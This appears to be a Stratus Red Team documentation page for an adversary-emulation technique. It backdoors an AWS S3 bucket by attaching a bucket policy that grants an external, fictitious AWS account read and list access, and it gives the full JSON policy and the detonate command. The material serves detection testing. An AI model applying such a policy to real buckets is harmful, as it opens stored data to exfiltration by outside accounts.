---
title: Backdoor an S3 Bucket via its Bucket Policy
---

# Backdoor an S3 Bucket via its Bucket Policy


 <span class="smallcaps w3-badge w3-blue w3-round w3-text-white" title="This attack technique can be detonated multiple times">idempotent</span> 

Platform: AWS

## MITRE ATT&CK Tactics


- Exfiltration

## Description


Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: 

- Create an S3 bucket.

<span style="font-variant: small-caps;">Detonation</span>: 

- Backdoor the S3 Bucket Policy by setting the following Bucket Policy:

<pre>
<code>
{
  "Version":"2012-10-17",
  "Statement":[
    {
      "Effect": "Allow",
      "Principal": {
        "AWS":"arn:aws:iam::193672423079:root"
      },
      "Action": [
        "s3:GetObject",
        "s3:GetBucketLocation",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::%s/*",
        "arn:aws:s3:::%s"
      ]
    }
  ]
}
</code>
</pre>


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.exfiltration.backdoor-s3-bucket-policy
```